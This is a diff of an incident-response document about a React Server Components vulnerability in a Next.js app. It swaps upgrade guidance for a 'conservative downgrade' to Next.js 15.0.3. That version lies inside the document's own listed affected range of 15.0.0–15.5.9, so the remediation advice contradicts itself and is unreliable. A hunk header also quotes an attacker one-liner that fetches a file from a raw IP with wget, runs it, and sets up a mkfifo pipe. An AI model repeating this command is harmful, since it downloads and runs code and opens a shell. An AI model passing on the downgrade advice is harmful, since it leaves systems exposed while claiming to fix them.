@@ -47,9 +47,16 @@ rm /tmp/*; cd /tmp; wget http://91.92.241.10/...; chmod +x ...; sh ...; mkfifo /
 - Next.js 15.0.0 - 15.5.9
 - All applications using React Server Components
 
-**Patched Versions**:
-- React 19.1.1+ (or 19.0.1+)
-- Next.js 15.5.10+ (or 15.0.1+)
+**Mitigation Strategy**: 
+Due to uncertainty about exact patched versions and ongoing vulnerability research, we're implementing a **conservative downgrade strategy**:
+- **React 19.x → React 18.3.1** (LTS, stable, no RSC by default)
+- **Next.js 15.x → Next.js 15.0.3** (stable version with RSC but with our hardening)
+
+This provides defense-in-depth:
+1. React 18.3.1 is not affected by React 19 vulnerabilities
+2. Next.js 15.0.3 is an earlier stable release
+3. Additional nginx hardening blocks RSC exploitation attempts
+4. Docker security prevents post-exploitation lateral movement
 
 ### react-server-dom Packages
 
@@ -231,29 +238,40 @@ Based on analysis, here's the most probable attack sequence:
 
 ### Priority 1: IMMEDIATE (Deploy within hours)
 
-#### 1. Upgrade React & Next.js to Patched Versions
+#### 1. Upgrade React & Next.js to Safer Versions
 
 **Action**: Update `frontend/package.json`
+
+**Conservative Downgrade Strategy**: Due to uncertainty about exact CVE-2025-55182 patch versions, we're downgrading to React 18.x LTS which is not affected by React 19 RSC vulnerabilities.
 
 ```json
 {
   "dependencies": {
-    "next": "15.5.10",
-    "react": "19.1.1", 
-    "react-dom": "19.1.1"
+    "next": "15.0.3",
+    "react": "^18.3.1", 
+    "react-dom": "^18.3.1"
   }
 }
 ```
 
+**Rationale**:
+- React 18.3.1 is LTS (Long Term Support) and stable
+- React 18.x does not have RSC vulnerabilities (RSC is React 19+ feature)
+- Next.js 15.0.3 is an earlier stable release before 15.5.x issues
+- Provides maximum compatibility and security
+
 **Commands**:
 ```bash
 cd frontend
-npm install next@15.5.10 react@19.1.1 react-dom@19.1.1
+npm install next@15.0.3 react@^18.3.1 react-dom@^18.3.1
 npm audit fix
 npm run build
 ```
 
-**Breaking Changes**: None expected (patch releases)
+**Breaking Changes**: 
+- May need to remove React 19-specific features if any were used
+- RSC features in React 19 will not be available (but this is the point)
+- Next.js 15.0.3 is stable and backward compatible
 
 #### 2. Add Nginx RSC Endpoint Protection
 
